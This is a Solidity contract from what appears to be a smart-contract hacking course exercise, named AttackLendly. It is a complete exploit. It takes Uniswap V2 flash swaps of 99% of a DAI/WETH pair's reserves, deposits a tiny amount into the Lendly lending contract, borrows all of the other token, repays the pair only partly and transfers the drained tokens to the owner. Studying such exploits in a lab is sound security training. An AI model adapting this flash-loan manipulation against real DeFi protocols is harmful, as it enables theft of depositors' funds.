// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IUniswapV2Pair} from "../interfaces/IUniswapV2.sol";
import {Lendly} from "./Lendly.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

contract AttackLendly is Ownable {
    IUniswapV2Pair private immutable pair;
    Lendly private immutable lendly;

    // token0 = DAI
    address private immutable token0;
    // token1 = WETH
    address private immutable token1;

    uint112 private reserve0;
    uint112 private reserve1;

    constructor(address _pair, address _lendly) {
        pair = IUniswapV2Pair(_pair);
        lendly = Lendly(_lendly);
        token0 = IUniswapV2Pair(pair).token0();
        token1 = IUniswapV2Pair(pair).token1();
    }

    function attack() external onlyOwner {
        uint256 wantedLoan;
        bytes memory data;

        // 1.Step - Get a DAI flash swap and drain all WETH

        // Get reserves of the  Pair smart contract
        (reserve0, reserve1,) = pair.getReserves();
        //  Flash loan 99% DAI liquidity and drain all WETH
        wantedLoan = reserve0 * 99 / 100;
        data = abi.encode(token0);

        pair.swap(wantedLoan, 0, address(this), data);

        // 2.Step - Get a WETH flash swap and drain all DAI
        // Get reserves of the  Pair smart contract
        (reserve0, reserve1,) = pair.getReserves();

        //  Flash loan 99% WETH liquidity and drain all WETH
        wantedLoan = reserve1 * 99 / 100;
        data = abi.encode(token1);

        pair.swap(0, wantedLoan, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "Only Pair can call");
        require(sender == address(this), "not sender");

        address token = abi.decode(data, (address));
        require(token == token0 || token == token1, "wrong token");

        uint256 amount = amount0 == 0 ? amount1 : amount0;

        // Deposit %0.1 of the amount because it is really expensive

        uint256 depositAmount = amount * 1 / 1000;

        IERC20(token).approve(address(lendly), depositAmount);
        lendly.deposit(token, depositAmount);

        // Determine other token address
        address otherToken;
        uint256 otherTokenReserve;

        if (token == token0) {
            otherToken = token1;
            otherTokenReserve = reserve1;
        } else {
            otherToken = token0;
            otherTokenReserve = reserve0;
        }

        // Borrow all the other token
        lendly.borrow(otherToken, IERC20(otherToken).balanceOf(address(lendly)));

        // Pay back only %99.9 to Uniswap

        uint256 tokenPaymentAmount = amount * 999 / 1000;

        // Amount to pay in the other token - other token reserve * 4 / 1000 (3 percent fee + 1 percent borrowed token) because 1% stayed in the Lendly
        uint256 otherTokenPaymentAmount = otherTokenReserve * 4 / 1000;

        IERC20(token).transfer(address(pair), tokenPaymentAmount);
        IERC20(otherToken).transfer(address(pair), otherTokenPaymentAmount);

        withdrawProfit();
    }

    function withdrawProfit() internal {
        IERC20(token0).transfer(owner(), IERC20(token0).balanceOf(address(this)));
        IERC20(token1).transfer(owner(), IERC20(token1).balanceOf(address(this)));
    }
}
